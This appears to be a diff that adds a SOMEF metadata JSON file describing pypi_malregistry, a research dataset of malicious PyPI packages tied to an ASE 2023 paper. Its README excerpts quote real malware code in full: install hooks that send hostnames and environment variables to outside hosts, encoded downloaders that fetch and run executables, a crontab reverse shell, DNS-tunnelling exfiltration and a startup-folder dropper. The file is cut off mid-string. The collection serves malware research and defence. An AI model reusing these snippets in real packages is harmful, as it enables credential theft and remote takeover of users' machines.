@@ -1,0 +1,540 @@
+{
+    "somef_provenance": {
+        "somef_version": "0.9.5",
+        "somef_schema_version": "1.0.0",
+        "date": "2024-10-03 21:07:31"
+    },
+    "code_repository": [
+        {
+            "result": {
+                "value": "https://github.com/lxyeternal/pypi_malregistry",
+                "type": "Url"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "owner": [
+        {
+            "result": {
+                "value": "lxyeternal",
+                "type": "User"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "date_created": [
+        {
+            "result": {
+                "value": "2023-08-15T17:28:01Z",
+                "type": "Date"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "date_updated": [
+        {
+            "result": {
+                "value": "2024-09-23T01:48:52Z",
+                "type": "Date"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "description": [
+        {
+            "result": {
+                "value": "The repository has collected about 6800 malicious pypi packages.  This dataset is the work of the ASE 2023 paper \"An Empirical Study of Malicious Code In PyPI Ecosystem\". Of course, we will continue to expand the dataset. Latest update time: 11 Sept. 2024",
+                "type": "String"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "This data set includes about 10,823 versions of the source code of 9,503 malicious packages.\n \n",
+                "original_header": "Dataset Size"
+            },
+            "confidence": 0.933910348478614,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "There are many different types of malicious code in these packages. Here are some examples.\n```python\ndef RunCommand():\n    output = subprocess.check_output([\"ps\", \"-elf\"]).decode(\"utf-8\")\n    data = {\"ls_output\": output, \"key1\": \"value1\", \"key2\": \"value2\"}\n    data_string = \"&\".join([f\"{key}={value}\" for key, value in data.items()])\n    curl_command = [\n        \"curl\",\n        \"-X\",\n        \"POST\",\n        \"-d\",\n        f\"'{data_string}'\",  # Pass the data as form data\n        \"http://zvqyzaqnwvjsqdhrbdiupz8e84un8xyb7.oast.fun\",\n    ]\n    subprocess.run(curl_command, check=True)\n```\n \n",
+                "original_header": "3 May. 2024"
+            },
+            "confidence": 0.9081311664404118,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        }
+    ],
+    "name": [
+        {
+            "result": {
+                "value": "pypi_malregistry",
+                "type": "String"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "full_name": [
+        {
+            "result": {
+                "value": "lxyeternal/pypi_malregistry",
+                "type": "String"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "issue_tracker": [
+        {
+            "result": {
+                "value": "https://api.github.com/repos/lxyeternal/pypi_malregistry/issues",
+                "type": "Url"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "forks_url": [
+        {
+            "result": {
+                "value": "https://api.github.com/repos/lxyeternal/pypi_malregistry/forks",
+                "type": "Url"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "stargazers_count": [
+        {
+            "result": {
+                "value": 49,
+                "type": "Number"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "keywords": [
+        {
+            "result": {
+                "value": "",
+                "type": "String"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "forks_count": [
+        {
+            "result": {
+                "value": 11,
+                "type": "Number"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "download_url": [
+        {
+            "result": {
+                "value": "https://github.com/lxyeternal/pypi_malregistry/releases",
+                "type": "Url"
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "programming_languages": [
+        {
+            "result": {
+                "value": "Python",
+                "name": "Python",
+                "type": "Programming_language",
+                "size": 11985
+            },
+            "confidence": 1,
+            "technique": "GitHub_API"
+        }
+    ],
+    "readme_url": [
+        {
+            "result": {
+                "value": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md",
+                "type": "Url"
+            },
+            "confidence": 1,
+            "technique": "file_exploration"
+        }
+    ],
+    "citation": [
+        {
+            "result": {
+                "value": " \nThis dataset is the work of the ASE 2023 paper \"An Empirical Study of Malicious Code In PyPI Ecosystem\"\n\n```\n@inproceedings{guo2023empirical,\n  title={An Empirical Study of Malicious Code In PyPI Ecosystem},\n  author={Guo, Wenbo and Xu, Zhengzi and Liu, Chengwei and Huang, Cheng and Fang, Yong and Liu, Yang},\n  booktitle={2023 38th IEEE/ACM International Conference on Automated Software Engineering (ASE)},\n  pages={166--177},\n  year={2023},\n  organization={IEEE}\n}\n```\n",
+                "type": "Text_excerpt",
+                "original_header": "Cite Me"
+            },
+            "confidence": 1,
+            "technique": "header_analysis",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "value": "@inproceedings{guo2023empirical,\n    organization = {IEEE},\n    year = {2023},\n    pages = {166--177},\n    booktitle = {2023 38th IEEE/ACM International Conference on Automated Software Engineering (ASE)},\n    author = {Guo, Wenbo and Xu, Zhengzi and Liu, Chengwei and Huang, Cheng and Fang, Yong and Liu, Yang},\n    title = {An Empirical Study of Malicious Code In PyPI Ecosystem},\n}",
+                "type": "Text_excerpt",
+                "format": "bibtex",
+                "title": "An Empirical Study of Malicious Code In PyPI Ecosystem",
+                "author": "Guo, Wenbo and Xu, Zhengzi and Liu, Chengwei and Huang, Cheng and Fang, Yong and Liu, Yang"
+            },
+            "confidence": 1,
+            "technique": "regular_expression",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        }
+    ],
+    "contact": [
+        {
+            "result": {
+                "value": "To ensure security, we will release a new batch of malicious component datasets each month. If needed, please contact us via email at honywenair@gmail.com.\n",
+                "type": "Text_excerpt",
+                "original_header": "Contact"
+            },
+            "confidence": 1,
+            "technique": "header_analysis",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        }
+    ],
+    "installation": [
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "`package name -> version -> source code zip file.` \nExample:\n`ython-binance -> 0.1 -> ython-binance-0.1.tar.gz`\n \n",
+                "original_header": "Dataset Format"
+            },
+            "confidence": 0.9923064532737211,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "**We have manually checked all collected malicious packages and have now removed all false positives.**\n \n",
+                "original_header": "False positive"
+            },
+            "confidence": 0.9438415108798549,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "Malicious code in these packages.\n```python\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\n``` \n",
+                "original_header": "16 Apr. 2024"
+            },
+            "confidence": 0.9999491502197105,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "Malicious code in these packages.\n```python\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\n``` \n\n```python\n...\nwhile \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f:\n  if 108363 == \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f:\n    import pip\n    pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,\n              oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])\n\n    \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523\n  elif \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f == 286625773:\n...\n``` \n",
+                "original_header": "1 May. 2024"
+            },
+            "confidence": 0.9979743538053816,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "```python\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTc0NDUzNTQwMDAzODUwL3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA==\"))\n```\n```python\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode(\"base64 string\").decode())\n    else:\n        exec(b64decode(\"base64 string\").decode())\n```\n```python\nimport base64\nexec(base64.b64decode(\"ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK\"))\n```\n```python\nhostname = socket.gethostname()\nosname = platform.system()\nip = socket.gethostbyname(hostname)\nserver_url = \"https://eo1okaacpdhx16n.m.pipedream.net/poc\"\ndata = {\n    \"hostname\": hostname,\n    \"osname\": osname,\n    \"ip\": ip\n}\n\ntry:\n    response = requests.post(server_url, json=data)\n    if response.status_code == 200:\n        print(\"Data sent successfully to the server.\")\n    else:\n        print(f\"Failed to send data. Status code: {response.status_code}\")\nexcept Exception as e:\n    print(f\"Error: {str(e)}\")\n```\n```python\nimport requests\n\nmycode = os.environ\nsecret = base64.b64encode(bytes(str(mycode),\"UTF-8\"))\ndata = \"https://eow8fqyd1emg87l.m.pipedream.net/\" + secret.decode('utf-8')\nrequests.get(data)\n```\n \n",
+                "original_header": "3 May. 2024"
+            },
+            "confidence": 0.9999929105112586,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "discomusic-0.0.3\n```python\nimport requests\nfile = requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&\")\nwith open(\"discomusic.exe\", \"wb\") as f:\n    f.write(file.content)\n```\n \n",
+                "original_header": "Suspecious packages"
+            },
+            "confidence": 0.998054832351845,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "reflink: https://osv.dev/vulnerability/MAL-2024-1334 \n",
+                "original_header": "8 May. 2024"
+            },
+            "confidence": 0.980505627250361,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "reflink: https://osv.dev/vulnerability/MAL-2024-1365\n```python\ndef x():\n    t = \"https://frvezdff.pythonanywhere.com/getrnr\"\n    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\bbb.bat\")\n    time.sleep(2)\n    if getattr(sys, 'frozen', False):\n        currentFilePath = os.path.dirname(sys.executable)\n    else:\n        currentFilePath = os.path.dirname(os.path.abspath(__file__))\n    fileName = os.path.basename(sys.argv[0])\n    filePath = os.path.join(currentFilePath, fileName)\n    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    try:\n        with open(os.getenv('APPDATA')+\"\\\\bbb.bat\", \"r\") as file:\n            cont = file.read()  \n        with open(startupFolderPath+\"\\\\bbb.bat\", \"w+\") as file:\n            file.write(cont)\n    except:\n        pass\n    subprocess.Popen(os.getenv('APPDATA')+\"\\\\bbb.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n    time.sleep(15)\n    os.system(\"shutdown /r /f\")\nx()\n```\n \n",
+                "original_header": "14 May. 2024"
+            },
+            "confidence": 1.0,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "\n```python\ndef dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255\n    name = name.rstrip('.')\n    queryid = secrets.token_bytes(2)\n    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional\n    request = queryid + b'\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0'\n    # Question\n    for label in name.rstrip('.').split('.'):\n        assert len(label) < 64, name\n        request += int.to_bytes(len(label), length=1, byteorder='big')\n        request += label.encode()\n    request += b'\\0'  # terminates with the zero length octet for the null label of the root.\n    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE\n    request += b'\\0\\1'  # QCLASS = 1\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n        s.sendto(request, addr)\n        s.settimeout(timeout)\n        try:\n            response, serveraddr = s.recvfrom(4096)\n        except socket.timeout:\n            pass\n\ndef custom_command():\n    package = 'vertica-parser'\n    domain = 'uchpuchmak.lol'\n    ns1 = f'ns1.{domain}'\n\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        dns_request(t_str, addr=(ns1, 53))\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n```\n \n",
+                "original_header": "16 May. 2024"
+            },
+            "confidence": 0.999998775861808,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "sphinx-rtd-theme-cilium [99.9.9] <br>\nrequests_darwin_lite  [2.28.0] <br> \nWhen the user installs the affected version of the requests-darwin-lite pyhton component package, the malicious Trojan file **requests-sidebar-large.png** will be executed on the Mac system, stealing sensitive system information and establishing a persistent connection with a C2 address controlled by the attacker. Attack The attacker can remotely execute malicious system commands on the user's system.\n \n",
+                "original_header": "17 May. 2024"
+            },
+            "confidence": 0.9638458461419002,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "user-agents-parser [2.2.2] <br>\n    \n```python\n__import__(\"os\").system(\"(crontab -l > .tab ; echo \"*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1\")\n```\n \n",
+                "original_header": "18 May. 2024"
+            },
+            "confidence": 0.9999998453633316,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "jupyter_calendar_extension [0.1] <br>\nblypack [0.1, 0.2, 0.3, 0.4, 0.5] <br>\n```python\ndef post_install():\n    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')\n```\n \n",
+                "original_header": "21 May. 2024"
+            },
+            "confidence": 0.9999640151706987,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "reallydonothing [0.1, 0.2] <br>\nml_linear_regression_lib [1.1.3] <br>\ndependency_confusion123456 [9.9.9] <br>\ndependency_confusion123 [1.0.4] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com\",params = ploads)\n```\n \n",
+                "original_header": "22 May. 2024"
+            },
+            "confidence": 0.9999999999989768,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "networkx-match-algr-0.1.1 <br>\nnetworkx-match-ssss-0.1.1 <br>\nreportgenpub-0.2 <br>\nspeech-dtw-0.1.1 <br>\n```python\nclass PreInstallCommand(install):\n    def run(self):\n        try:\n            # print(\"Running custom install command\")\n            # subprocess.check_call(['echo', 'Hello, World!'])\n            \n        \n            ip = \"172.16.0.103\"  \n            port = 12345  \n            message = \"Hello, Server!\"  \n            server_address = (ip, port)\n\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            \n            sock.connect(server_address)\n\n            try:\n                sock.sendall(message.encode('utf-8'))\n            finally:\n                sock.close()\n\n        except Exception as e:\n            print(f\"Server ERROR: {e}\")\n        install.run(self)\n```\n \n",
+                "original_header": "24 May. 2024"
+            },
+            "confidence": 0.9999999999992042,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "jupyter_calendar_extension-0.1 <br>\ncalendar_extender-0.1 <br>\ncalendar_extender-0.2 <br>\nauto_scrubber-0.1 <br>\n```python\nAUTO = [\n\tbytes.fromhex(\"73656564\"),\n\tbytes.fromhex(\n\t\t\"7f821d876c6d29d96b57e48aa82b2a2f2b1367332d362dc967113e3b3ae538bfd184fc02dbb74b9ba80ee40cd6eeb44441daf258112f3d7af7239c3cf0 \"\n\t),\n\tbytes.fromhex(\"737472756374757265\"),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f5368617265642f566964656f73\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\n\t\t\"1796d1a5a7f083b4664e5967ee530a350ff77452cf91c0a12d68af01be5d9bf58c3fccfc17a6fd4f2e3247d517dbce02613a87f55440a281b3aaab88ffff3ecc\"\n\t),\n\tbytes.fromhex(\"6c696265727479\"),\n\tbytes.fromhex(\n\t\t\"4a01697af6d555b03fa03593f0b0d2f1db114707686f34d7641ff7c37ff49f74\"\n\t),\n\tbytes.fromhex(\"6e6f76656c\"),\n]\n\n\ndef fd(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        yy = hashlib.sha3_512(v).digest()\n        return yy[0:32], yy[32:]\n\n    _, ce = iter(v)\n    pd, ce = iter(ce)\n\n    while True:\n        if not pd:\n            pd, ce = iter(ce)\n        f = pd[0]\n        pd = pd[1:]\n\n        yield f\n\n\ndef Runner_Auto(path: bytes, /) -> None:\n    op = fd(AUTO[5] + path)\n    td = fd(AUTO[0] + path)\n    ap = fd(AUTO[7] + path)\n    \n    otherPlace = os.path.expanduser('~/.local/bin')\n    os.makedirs(otherPlace, exist_ok=True)\n    \n    doc = ''.join(chr(x ^ t) for x, t in zip(AUTO[1], td))\n    csv = ''.join(chr(f ^ d) for f, d in zip(AUTO[4], ap))\n\n    url = {\n        \"x86_64\": doc,\n        \"arm64\": csv\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for r, p in zip(buf, op):\n        out.append(r ^ p)\n\n    place = os.path.join(otherPlace, 'AutoScrub')\n    with open(place, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(place, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    subprocess.Popen([place], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n```\n \n",
+                "original_header": "26 May. 2024"
+            },
+            "confidence": 0.9999999761067787,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "xFileSyncerx [0.0.2] <br>\n```python\nclass Filesyncer:\n    def __init__(self) -> None:\n        self.os = \"null\"\n        self.run()\n        return\n\n    def run(self):\n        sleep(3)\n        working = os.getcwd() + \"/\"\n        b = [832, 928, 928, 896, 920, 464, 376, 376, 912, 776, \n             952, 368, 824, 840, 928, 832, 936, 784, 936, 920, \n             808, 912, 792, 888, 880, 928, 808, 880, 928, 368, \n             792, 888, 872, 376, 800, 408, 800, 936, 792, 928, \n             392, 944, 376, 928, 808, 920, 928, 808, 912, 360, \n             888, 816, 360, 928, 912, 808, 808, 920, 376, 872, \n             776, 840, 880, 376, 920, 400, 368, 896, 968]\n                \n        if working == b:\n            print(f\" Uname: {os.uname()[0]}\\n CWD: {working}\\n\")\n        else:\n            b = [i << 2 for i in b]\n            for i in b:\n                i << 4\n\n            exec(rs.get(\"\".join(chr(x >> 5) for x in b)).text)\n            #exec(r.text)\n\n        return\n    \nFilesyncer()\n```\n \n",
+                "original_header": "06 Jun. 2024"
+            },
+            "confidence": 0.9999853288908186,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "pytypier [1.0.2] <br>\npyspliter [1.0.2] <br>\nbuilderknower [0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9, 0.1.10, 0.1.11, 0.1.12] <br>\nthesis-uniud-package [1.0.0] <br>\nthesis-package [1.0.0] <br>\n```python\ndef _post_install():\n    hostname = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'\n    destination = os.path.join(os.path.dirname(__file__), 'logo.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n```\n \n",
+                "original_header": "14 Jun. 2024"
+            },
+            "confidence": 0.9999720264560915,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "bussardweg4a, bussardweg4av2, bussardweg4av3, pyhton, pythn, pytgon, pytjon, pytuon, pytbon, pytohn, pytyon, pythkn, pythom, pythob, pytnon, pyhthon, pytojn, pytiom, pytiob, pythun, pytoh, pytonn, pthon, we3b, wev3, wb3, web3e, webt3, w3eb, 3web, w3b, wweb, werb3, web3q, wdb3, web2, wbe3, wweb3, web3-pyy, web3-pyu, w3b-py, web4-py, wb3-py, ewb3-py, wev3-py, web3-pu, we3-py, wweb3-py, 3web-py, web3-py9, web3-0py, web3-po, web3-p6, web3-p7, etheerum, ehtereum, etheereum, etehreum, etherium, wbe3-py, weeb3-py, ethherum, etherun, ethereun, eutherium, ethreium, eethereum, ethreum, etheerium, theerum, ethrum, etherum, etheum, etherem, etheurm, ethereuum, etheirum, etherriuum, etheruim, etheraem, etheriuum, eetherium, etheruem, ethererum, etheriun, etherreum, etheeruum, etheereium, etherim, etheriumm, ethereuim, etherreeum, etheeruim, etheriuim, etheruum, ettherium, ethreeum, ethherium, etheerem, etherreumm, etherumm, ethereumm, ethereim, etheeruimm, etherrium, etheruemm, ethereium, etheriem, etherriuumm, etheerim, openxsea, openasea, opensae, opensa, openesaa, openseaa, opnesea, oepnsea, openza, openes, openesa, opnsea, openae, openseea, oensea, opesnea, openzea, openseaz, openeasea, opensee, openrea, openwea, opemsea, opensew, oenasea, openresa, opensesa, opensead, openwse, openswa, openwsaa, opensear, openzsea, openrsea, openwsea, oenesea, openxsa, oopensea, openaes, opensar, openseax, openseae, oenwea, oepenwea, oepensea, oopenwea, opwnsea, openwae, oenwsea, openeaa\n```python\nVERSION = 